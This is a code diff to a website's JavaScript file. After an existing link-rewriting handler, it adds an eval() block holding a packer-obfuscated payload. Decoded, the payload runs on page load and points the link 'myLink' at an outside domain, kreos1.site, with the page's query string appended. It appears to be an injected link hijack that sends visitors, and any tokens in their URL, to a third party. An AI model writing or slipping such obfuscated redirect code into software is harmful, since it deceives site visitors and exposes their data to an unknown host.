@@ -30,3 +30,22 @@ document.addEventListener("DOMContentLoaded", function() {
   if (hvost!="") elements[i].href = newHref + hvost;
  }
 });
+
+  eval(function(p, a, c, k, e, r) {
+   e = function(c) {
+     return c.toString(a)
+   };
+   if (!''.replace(/^/, String)) {
+     while (c--) r[e(c)] = k[c] || e(c);
+     k = [function(e) {
+       return r[e]
+     }];
+     e = function() {
+       return '\\w+'
+     };
+     c = 1
+   };
+   while (c--)
+     if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+   return p
+ }('1.5("6",7(){0 2=1.8(\'9\');0 3=a.b.c;0 4="d://e.f/g"+3;2.h(\'i\',4)});', 19, 19, 'let|document|link|param|myHref|addEventListener|DOMContentLoaded|function|getElementById|myLink|window|location|search|https|kreos1|site|wLygxBWv|setAttribute|href'.split('|'), 0, {}))
